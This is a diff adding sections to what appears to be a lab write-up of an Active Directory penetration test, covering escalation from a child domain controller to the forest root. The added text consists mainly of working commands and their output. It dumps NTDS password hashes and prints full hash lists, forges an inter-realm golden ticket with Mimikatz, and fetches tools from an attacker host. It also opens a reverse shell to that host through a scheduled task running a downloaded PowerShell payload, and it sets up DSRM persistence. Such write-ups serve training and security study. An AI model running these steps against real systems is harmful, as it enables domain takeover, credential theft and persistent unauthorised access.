@@ -10,6 +10,10 @@
   - [Requests using support keytab](#requests-using-support-keytab)
   - [Setting Jenkin server as HTTP SOCKS Proxy](#setting-jenkin-server-as-http-socks-proxy)
   - [Pass-the-Ticket](#pass-the-ticket)
+  - [Hash dumping on Child-DC](#hash-dumping-on-child-dc)
+  - [Forge Inter-realm TGT](#forge-inter-realm-tgt)
+  - [Password Dumping on Forest DC](#password-dumping-on-forest-dc)
+- [External Trust Enumeration](#external-trust-enumeration)
 
 ---
 
@@ -418,4 +422,361 @@ proxychains psexec.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
 However, it is not successful. A possible reason is the time difference of the attacker machine and the target is greater than 15 minutes.
 
 ![picture 13](images/618dc3ec3107fc274218c7a51a1a24207f8e7b1f48cef5666e46ba0462c08e96.png)  
+
+<br/>
+
+This should be working after the target machine is rebooted:
+![picture 14](images/45bd6dc0eea929a798ded1e68ee20c58bc8ad03c02d14faf10aaa11fd823c983.png)  
+
+<br/>
+
+## Hash dumping on Child-DC
+
+Use Impacket `secretdump.py` to dump hashes on Child-DC:
+
+```
+proxychains secretsdump.py -k -no-pass -just-dc-user adm_domain -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
+```
+
+<br/>
+
+The NTLM hash of `adm_domain` is obtained `3d15cb1141d579823f8bb08f1f23e316`:
+![picture 15](images/589d7dca8aa16299157bd50b890142b15c4d8e49c0de75c30d9e7aaedbdbae6d.png)  
+
+<br/>
+
+Also dump all the hashes in the `ntds.dit` database since this is a DC:
+
+```
+proxychains secretsdump.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
+```
+
+```                          
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:56df9bfe3024dd4eb25b412ead89fe08:::
+
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+OPERATIONS\OPS-CHILDDC$:plain_password_hex:387d08d86a6383f9163bcca0d01896d6501e47135dccdbd10296852d8acf70bd0e92b2796ae215395046deac5c12e58f2535177a536972fa6bd784350b975cba831e237829a9017ea9623fa8567be6159c95f46ae
+a2465504b3019fa3992ddbec78e55d1adfc44819d83754b577e91762568f50becacb418320d97444d9da8447e23feec121a3b625a0521f508c69551cea74b91f6f3c7934364caf1167ace1c94e47391331475e682b67e2d5c706cdb01370da98ad7dbdb6778be413eece
+0115966fb73c6986786afaa6795e7fbd35660e5964d81c65b0d0e040cc1546d6782e462c91cef06b18c6ce26fda97927176
+
+OPERATIONS\OPS-CHILDDC$:aad3b435b51404eeaad3b435b51404ee:557a460cc1438fb35870b75383608196:::
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e2b8effbf6735b8fb5be206cb3dfead:::
+
+operations.atomic.site\sysadmin:1110:aad3b435b51404eeaad3b435b51404ee:33da4461cc64d97d6766bea54d8824c7:::
+
+operations.atomic.site\support:1114:aad3b435b51404eeaad3b435b51404ee:dd8ab1ad74d9faf1900eac349c8fb3e5:::
+
+[+] Decrypting hash for user: CN=Homi Jehangir Bhabha,OU=Employee,DC=operations,DC=atomic,DC=site
+operations.atomic.site\homi:1115:aad3b435b51404eeaad3b435b51404ee:4d32b988b70b389423886883f666ed66:::
+
+[+] Decrypting hash for user: CN=Iyer Murty,OU=Employee,DC=operations,DC=atomic,DC=site
+operations.atomic.site\iyer:1116:aad3b435b51404eeaad3b435b51404ee:493483461831ba82fe193fe01653da6a:::
+
+[+] Decrypting hash for user: CN=Srinivasa Krishnan,OU=Employee,DC=operations,DC=atomic,DC=site
+operations.atomic.site\sri:1117:aad3b435b51404eeaad3b435b51404ee:50e3b28275dc32db9f2e82b2e25968e2:::
+
+[+] Decrypting hash for user: CN=Service-DB,OU=Service Accounts,DC=operations,DC=atomic,DC=site
+operations.atomic.site\srv-db:1118:aad3b435b51404eeaad3b435b51404ee:c60cc979b81b15f2e23848eac75bef16:::
+
+[+] Decrypting hash for user: CN=service-auto,OU=Service Accounts,DC=operations,DC=atomic,DC=site
+operations.atomic.site\srv-auto:1119:aad3b435b51404eeaad3b435b51404ee:ea06afda9cb34106ddaf747108eb1af1:::
+
+[+]] Decrypting hash for user: CN=Admin Domain,OU=Service Accounts,DC=operations,DC=atomic,DC=site
+operations.atomic.site\adm_domain:1121:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
+
+[+] Decrypting hash for user: CN=IIS-admin,OU=Service Accounts,DC=operations,DC=atomic,DC=site
+operations.atomic.site\iisadmin:1126:aad3b435b51404eeaad3b435b51404ee:7e44e374b6a9d37380d77970d8e2e2dc:::
+
+[+] Decrypting hash for user: CN=OPS-CHILDDC,OU=Domain Controllers,DC=operations,DC=atomic,DC=site
+OPS-CHILDDC$:1000:aad3b435b51404eeaad3b435b51404ee:557a460cc1438fb35870b75383608196:::
+
+[+] Decrypting hash for user: CN=DB-SERVER,CN=Computers,DC=operations,DC=atomic,DC=site
+DB-SERVER$:1111:aad3b435b51404eeaad3b435b51404ee:8ebe356223ef0b7b8831ba3349e12513:::
+
+[+] Decrypting hash for user: CN=REPO-SERVER,CN=Computers,DC=operations,DC=atomic,DC=site
+OPERATIONS.ATOMIC.SITE\REPO-SERVER$:1112:aad3b435b51404eeaad3b435b51404ee:f3cbb96681af765b402de7b8624f8f5c:::
+
+[+] Decrypting hash for user: CN=AUTOMATION-SERV,CN=Computers,DC=operations,DC=atomic,DC=site
+OPERATIONS.ATOMIC.SITE\AUTOMATION-SERV$:1113:aad3b435b51404eeaad3b435b51404ee:4930f9a7ea2e28c8d90d1c6c94725866:::
+
+[+] Decrypting hash for user: CN=SCIENTIST-MACHI,CN=Computers,DC=operations,DC=atomic,DC=site
+SCIENTIST-MACHI$:3101:aad3b435b51404eeaad3b435b51404ee:35d811fb8407f03f017e770729475a2c:::
+
+[+] Decrypting hash for user: CN=ATOMIC$,CN=Users,DC=operations,DC=atomic,DC=site
+ATOMIC$:1103:aad3b435b51404eeaad3b435b51404ee:6d76fb226a7109795a970e9a8f466833:::
+
+```
+<br/>
+
+To obtain the Domain SID, we can use `wmic` in the PSExec shell:
+
+```
+wmic group where name="Domain Admins" get name,sid,domain
+```
+
+![picture 16](images/e2162f3fd4a140703625faeaaebb190b818e7bd5d14bfabe4e466fc14f256ae9.png)  
+
+
+Operations.atomic.site:<br/>
+`S-1-5-21-3757735274-1965336150-1982876978`
+<br/>
+Atomic.site:<br/>
+`S-1-5-21-95921459-2896253700-3873779052`
+<br/>
+
+<br/>
+
+## Forge Inter-realm TGT
+
+In order to get into the Parent DC, with the NTLM of `krbtgt` account, we can forge inter-realm TGT using Mimikatz.
+<br/>
+
+In the attacker machine, serve Mimikatz.exe:
+
+```
+cd /usr/share/windows-resources/mimikatz/x64
+python3 -m http.server 80
+```
+
+<br/>
+
+Then in the PSExec shell, download mimikatz:
+
+```
+cd C:\Users\Public
+certutil -urlcache -f http://192.168.100.11/mimikatz.exe .\mimikatz.exe
+```
+
+![picture 17](images/68f9f99a76488d267206f5669f874034148915c7e79551fcd3a81d2aab8d3470.png)  
+
+<br/>
+
+Then run `mimikatz.exe` to forge a inter-realm TGT:
+
+```
+kerberos::golden /user:adm_domain /domain:operations.atomic.site /sid:S-1-5-21-3757735274-1965336150-1982876978 /sids:S-1-5-21-95921459-2896253700-3873779052-512 /krbtgt:8e2b8effbf6735b8fb5be206cb3dfead /ticket:C:\Users\Public\forge.kirbi
+```
+
+![picture 19](images/bfe58642c9a6815786acd2d09cae6f983aa89bc27c470eda3d787cbd766b000b.png)  
+
+<br/>
+
+Check the forest DC hostname:
+
+```
+nslookup -type=any _ldap._tcp.dc._msdcs.atomic.site
+```
+
+![picture 20](images/a3ef9e2bf9290e19cf37485c7380467c1e3137716c278d8f80f5c7d0db1d2a74.png)  
+
+* IP:  `10.1.1.1`
+* Hostname: `atomic-dc.atomic.site`
+
+<br/>
+
+Use Mimiaktz to perform PTT:
+
+```
+kerberos::ptt C:\Users\Public\forge.kirbi
+```
+
+![picture 21](images/3d4935678f5dac3acb5f30bcda9ef2b528ece3627530508151cd96e25be818f8.png)  
+
+<br/>
+
+Try to list the forest DC's root directory:
+
+```
+dir \\atomic-dc.atomic.site\c$
+```
+
+![picture 22](images/9d1f92e01951a23cfb3eff7c506c6e374f6eab074a9c1af5ca64a95431b560d9.png)  
+
+As shown, we now have the forest dc access.
+
+<br/>
+
+To get a reverse shell, modify the `Invoke-PowerShellTcp.ps1` from Nishang by adding the following in the last line:
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.11 -Port 443
+```
+
+<br/>
+
+Then on the local machine, prepare a nc listener:
+
+```
+nc -nlvp 443
+```
+
+<br/>
+
+Also serve the `Invoke-PowerShellTcp.ps1` script:
+
+```
+python3 -m http.server 80
+```
+
+<br/>
+
+On the PSExec shell, create a remote schedule task:
+
+```
+schtasks /create /S atomic-dc.atomic.site /SC Weekly /RU "Administrator" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object System.Net.WebClient).DownloadString(''http://192.168.100.11/Invoke-PowerShellTcp.ps1''')'"
+```
+
+<br/>
+
+Run the scheduled task:
+
+```
+schtasks /Run /S atomic-dc.atomic.site /TN "STCheck"
+```
+
+![picture 23](images/bf629e2a350220e7a572a694bf1c227657ab3babd7cdc7c8d5fe4dd6a3791e03.png)  
+
+![picture 24](images/f289ccd0e2f98d3d88fbeccb77929233a3e32a972532f7393ba5d3721b8c477b.png)  
+
+<br/>
+
+As shown, we have a reverse shell on the Forest DC `ATOMIC-DC`.
+
+<br/>
+
+## Password Dumping on Forest DC
+
+First download mimikatz:
+
+```
+cd C:\Users\Public
+wget http://192.168.100.11/Invoke-Mimikatz.ps1 -OutFile .\Invoke-Mimikatz.ps1
+```
+
+<br/>
+
+Then dump password using Mimikatz powershell script:
+
+```
+. .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -DumpCreds
+```
+
+![picture 25](images/022aca0d2b40796410c37ef55ad0a7d8b11167c511765a0ec854e9fb6a95ed97.png)  
+
+As shown, we obtain the Enterprise Admin NTLM:<br/>
+`c49927a1eb5a335dfb681db95d3a45a2`
+
+<br/>
+
+```
+ATOMIC\Administrator:
+SID:   S-1-5-21-95921459-2896253700-3873779052-500
+NTLM:  c49927a1eb5a335dfb681db95d3a45a2
+
+ATOMIC\ATOMIC-DC$
+SID:   S-1-5-90-0-1
+NTLM:  f2a2a8b45cfc4d08481ab3c6e1b531e0
+```
+
+<br/>
+
+Also dump the DSRM key:
+
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+```
+
+![picture 26](images/99f37e2a1bfefa77dac177d7a6adab97eb27e0bc1e1412c21a0be430435b4e2b.png)  
+
+* DSRM: `56df9bfe3024dd4eb25b412ead89fe08`
+
+<br/>
+
+To persist, enable DSRM usage over network:
+
+```
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonbehavior" -Value 2 -PropertyType DWORD
+```
+
+![picture 27](images/5efad717b6939b2377402a7356b68255e1dac2dacaaa95cd938f1a1aa63db95f.png)  
+
+<br/>
+
+Dump all hashes:
+
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+```
+Domain : ATOMIC / S-1-5-21-95921459-2896253700-3873779052                                                                                                                                                           
+                                                                                                                                                                                                                    
+RID  : 000001f4 (500)                                                                                                                                                                                               
+User : Administrator                                                                                                                                                                                                
+LM   :                                                                                                                                                                                                              
+NTLM : c49927a1eb5a335dfb681db95d3a45a2                                                                                                                                                                             
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   : 
+NTLM : 5d14653ad207e053f2dbb9e3833b08bf
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   : 
+NTLM : 
+
+RID  : 00000457 (1111)
+User : atasrv
+LM   : 
+NTLM : 7f9b42b69b821e3526263ab93bb407bf
+
+RID  : 00000835 (2101)
+User : fsp-user
+LM   : 
+NTLM : 66efe4960b2a96982f06f7af2966fa1b
+
+RID  : 000003e8 (1000)
+User : ATOMIC-DC$
+LM   : 
+NTLM : f2a2a8b45cfc4d08481ab3c6e1b531e0
+
+RID  : 00000455 (1109)
+User : OPERATIONS$
+LM   : 
+NTLM : 38e5f1f81e90a4ae014f83429a36a082
+
+RID  : 0000045a (1114)
+User : NUCLEAR$
+LM   : 
+NTLM : 285520f366660265a99ec7bc9603d6b2
+```
+
+<br/>
+
+As shown in the result, there is an unknown machine account "nuclear". Try to use nslookup to resolve:
+
+```
+nslookup nuclear.site
+```
+
+![picture 28](images/9e3641583d7ea923b6094d0da03bd221b9989fba8c14c92bb3ccce01cb83a479.png)  
+
+<br/>
+
+In so, `285520f366660265a99ec7bc9603d6b2` is likely the trust key.
+
+<br/>
+
+# External Trust Enumeration
 
